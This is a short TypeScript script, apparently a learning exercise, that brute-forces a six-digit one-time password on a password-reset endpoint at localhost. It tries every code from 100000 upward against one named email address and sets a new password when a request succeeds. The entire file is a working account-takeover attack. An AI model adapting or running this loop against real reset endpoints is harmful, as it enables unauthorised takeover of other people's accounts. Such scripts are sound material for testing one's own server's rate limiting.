import axios from "axios"

let atteck=async(otp:Number)=> {
   try{
      let resp=await axios.post("http://localhost:3000/reset-password",{
         email: "barathraj048@gmail.com",
         otp: otp.toString(),
         newPassword: "newpassword123"
      })
      console.log(resp.data)
      return resp.status
   }catch(e){
      console.log(e)
   }
}


let bruteForce=async()=>{
   for(let i=100000;i<999999;i++){
      let status:any=await atteck(i)
      if(status==200){
         console.log("Success") 
         break
      }else{
         console.log("Failed")
         console.log(status,"am retrying"+i+1)
      }
   }
}
bruteForce()
console.log("im working")